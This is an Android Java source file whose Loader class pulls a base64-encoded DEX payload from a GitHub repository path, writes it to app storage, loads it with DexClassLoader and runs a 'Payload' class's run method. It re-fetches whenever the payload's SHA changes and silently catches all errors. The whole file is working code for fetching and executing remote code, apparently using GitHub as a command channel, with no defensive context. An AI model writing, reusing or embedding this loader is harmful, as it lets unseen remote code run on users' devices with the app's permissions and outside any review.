package com.yb.fa;

import org.json.*;
import android.content.Context;
import android.util.Base64;
import dalvik.system.DexClassLoader;
import java.io.*;
import java.lang.reflect.Method;

public class Loader {
    static String curSha = null;
    static Object lastInst = null;
    static Method mRun = null;
    public static volatile String log = "";

    public static void tick(Context ctx, GitHub gh) {
        try {
            JSONObject j = gh.getJson("payload/payload.dex.json");
            if (j == null) { log = "no payload"; return; }
            String sha = j.optString("_sha", "");
            String b64 = j.optString("b64", "");
            if (b64.length() < 100) { log = "empty payload"; return; }
            boolean changed = (curSha == null) || !sha.equals(curSha) || (lastInst == null);
            if (changed) {
                File dir = new File(ctx.getFilesDir(), "dyn");
                dir.mkdirs();
                File dex = new File(dir, "payload.dex");
                FileOutputStream fo = new FileOutputStream(dex);
                fo.write(Base64.decode(b64, Base64.DEFAULT));
                fo.close();
                File opt = new File(dir, "opt");
                opt.mkdirs();
                DexClassLoader cl = new DexClassLoader(dex.getAbsolutePath(),
                        opt.getAbsolutePath(), null, ctx.getClassLoader());
                Class<?> c = cl.loadClass("Payload");
                lastInst = c.newInstance();
                mRun = c.getMethod("run", GitHub.class, Context.class);
                curSha = sha;
                log = "loaded dex sha=" + sha;
            }
            mRun.invoke(lastInst, gh, ctx);
            log = "ran ok sha=" + sha.substring(0, Math.min(12, sha.length()));
        } catch (Throwable e) {
            log = "loader err: " + e;
        }
    }
}
